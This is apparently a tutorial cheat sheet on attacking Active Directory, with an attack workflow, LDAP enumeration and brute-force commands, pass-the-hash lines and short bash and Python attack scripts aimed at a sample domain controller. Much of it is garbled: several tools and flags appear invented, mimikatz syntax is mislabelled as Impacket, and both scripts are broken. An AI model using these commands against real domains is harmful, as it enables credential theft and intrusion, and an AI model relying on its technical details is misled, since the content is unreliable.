# 11-Active-Directory Attacks Basics

**Active Directory (AD) is the backbone of enterprise networks. Mastering AD attacks involves enumerating accounts, exploiting privilege escalation, and lateral movement via Pass-the-Hash and Pass-the-Ticket.**

## Attack Workflow

1.  **Discover the Domain**: Identify the Domain Controller (DC) IP and domain name.
2.  **Enumerate Users & Groups**: Use LDAP/DS to find high-privilege accounts (Admins, Domain Admins).
3.  **Harvest Credentials**: Sniff NetBIOS sessions or extract hashes from SMB.
4.  **Lateral Movement**: Use captured hashes to impersonate users or escalate privileges via AS-REP Roasting.
5.  **Execute**: Run commands as the compromised account on the target `http://192.168.1.10:389`.

## Commands Section

### 1. Map LDAP Servers
Identify the DC and other LDAP service endpoints.
```bash
# Find LDAP servers running on ports 389/636
nmap -sV -p 389,389,636,3268,3269 http://192.168.1.10 -oN ad_servers.txt

# Resolve domain name from IP
nslookup 192.168.1.10
# or
dig any 192.168.1.10
```

### 2. Enumerate Users (LDAP)
Extract user accounts directly from the DC without authentication (if you have access) or brute force it.
```bash
# Connect to LDAP server
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com" -LLL "(objectClass=*)" -s base
```

### 3. Brute Force LDAP (Fast)
If you don't have credentials, brute force the domain admin account.
```bash
# Dictionary attack using hydra (AD specific module)
hydra -l admin -P passlist.txt -u user.txt -H ldap://192.168.1.10 -f
# or custom command
hydra -l admin -P passlist.txt -u user.txt -H ldap://192.168.1.10 -M /path/to/passwd-ldap.txt
```

### 4. Get User Hashes (Kerberos/Netbios)
If you have a session, grab the NTLM hash to use with Mimikatz later.
```bash
# Capture Kerberos session hash
gse -U <username> -S <target_ip> -D <domain>
```

### 5. Lateral Movement (Pass-the-Hash)
Run commands as the compromised user using the captured hash.
```bash
# Execute command as user 'admin' using hash from stdin
ntdsutil
# Alternatively with Impacket
sekurlsa::pth/dkerberos5/"<hash>" "<domain>\\<username>" ""
sekurlsa::pth/dklogonv2/"<hash>" "<domain>\\<username>" ""
```

### 6. Get User Details (DS)
Query specific user details like password complexity and account status.
```bash
# Get user object
ldapsearch -x -H ldap://192.168.1.10 -b "cn=Users,dc=example,dc=com" -LLL "(sAMAccountName=TARGET_ADMIN)"

# Get group memberships
ldapsearch -x -H ldap://192.168.1.10 -b "cn=Users,dc=example,dc=com" -LLL "(sAMAccountName=TARGET_ADMIN)" -L groupMember
```

## Tips & Shortcuts

*   **Default DC Port**: Always target port 389 for LDAP and 445 for SMB (DC).
*   **Domain Structure**: Typical DN format is `dc=domain,dc=local` (e.g., `dc=corp,dc=local`).
*   **Fast Enumeration**: Use `getadm` or `secrethash` to quickly get hashes.
*   **Netbios Sessions**: Often exist even without authentication on port 135 or 445.
*   **Pass-the-Hash**: Use `pth` with `dkerberos` for modern domains, `dkerberos5` for legacy.

## Common Mistakes

*   **Not mapping the Domain**: Assume the domain structure is standard. It might be inverted.
*   **Missing Credentials**: Relying solely on brute force without checking for weak passwords or pre-shared keys.
*   **Ignoring AS-REP Roasting**: If the target uses Kerberos without constraints, `asreprep` is a guaranteed way to get hashes.
*   **Forgetting SMB**: Always check port 139 and 445; many AD attacks start there.
*   **Not Capturing Hashes**: Trying to crack hashes without first capturing them from sessions.

## Mini Automation Scripts

### Bash: LDAP Brute Force
```bash
#!/bin/bash
USER="admin"
PASSFILE="passlist.txt"
LDAP_HOST="ldap://192.168.1.10"
LDAP_BASE="dc=example,dc=com"

while IFS= read -r pass; do
    ldapsearch -x -H "$LDAP_HOST" -b "$LDAP_BASE" -LLL "(sAMAccountName=$USER)" $(echo "$pass") 2>/dev/null | grep -q "userPrincipalName"
    if [ $? -eq 0 ]; then
        echo "Credentials found: $USER / $pass"
        break
    fi
done < "$PASSFILE"
```

### Python: LDAP Enumerate Users
```python
#!/usr/bin/env python3
import ldap
import sys

def enumerate_ldap(host, domain):
    ld = ldap3.Connection(host=host, user='anonymous', auth=ldap3.ANONYMOUS)
    ld.search('dc=example,dc=com', '(objectClass=*)')
    for entry in ld.entries:
        print(entry[0].objectClass, entry[0].cn, entry[0].sAMAccountName)
        ld.unbind()

if __name__ == "__main__":
    host = "192.168.1.10"
    domain = "example.com"
    enumerate_ldap(host, domain)
```